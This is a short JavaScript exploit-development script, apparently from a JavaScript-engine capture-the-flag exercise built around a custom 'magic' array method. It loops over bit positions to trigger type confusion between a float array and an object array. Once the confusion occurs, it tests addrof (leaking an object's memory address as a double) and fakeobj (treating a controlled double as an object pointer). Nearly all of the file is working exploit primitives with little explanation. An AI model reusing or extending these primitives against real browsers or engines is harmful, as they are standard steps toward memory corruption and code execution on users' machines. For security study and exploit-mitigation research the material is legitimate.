// Test different bit positions
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u64 = new BigUint64Array(buf);

function d2u(d) {
    f64[0] = d;
    return u64[0];
}

// Try different bit positions
for (let bit = 32; bit < 40; bit++) {
    for (let i = 0; i < 0x1000; i++) {
        let a = [1.1, 2.2];
        let b = [{}, {}];
        
        a.magic(a.length, bit);
        
        if (typeof b[0] === 'number') {
            console.log("Type confusion with bit " + bit + " at iteration " + i);
            console.log("b[0] =", b[0]);
            console.log("Hex:", '0x' + d2u(b[0]).toString(16));
            
            // Now test addr of
            let test_obj = {x: 42};
            b[0] = test_obj;
            let addr = d2u(a[0]);
            console.log("addrof test_obj: 0x" + addr.toString(16));
            
            // Test fakeobj
            a[0] = 1.1;
            let recovered = b[0];
            console.log("fakeobj result:", recovered);
            break;
        }
    }
}
